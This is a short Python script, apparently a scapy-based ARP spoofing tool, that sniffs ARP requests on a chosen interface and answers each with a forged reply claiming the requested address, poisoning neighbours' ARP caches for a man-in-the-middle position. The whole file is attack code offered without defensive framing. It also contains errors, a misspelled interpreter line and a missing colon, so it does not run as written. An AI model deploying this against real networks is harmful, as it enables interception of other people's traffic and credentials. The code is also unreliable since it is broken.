#!/usr/bin/pythion3

import sys
from scapy.all import sniff, sendp, ARP, Ether

if len(sys.argv) < 2:
	print(sys.argv[0] + " <iface_id>")
	sys.exit(1)

def arp_poison_callback(packet):
	if packet[ARP].op ==1
		answer = Ether(dst=packet[ARP].hwsrc) / ARP()
		answer[ARP].op = "is-at"
		answer[ARP].hwdst = packet[ARP].hwsrc
		answer[ARP].psrc = packet[ARP].pdst
		answer[ARP].pdst = packet[ARP].psrc

		print("SPOOFING " + packet[ARP].psrc + " MAC " + packet[ARP].pdst + " is me...")

		sendp(answer, iface=sys.argv[1])

sniff(prn=arp_poison_callback, filter="arp", iface=sys.argv[1], store=0)
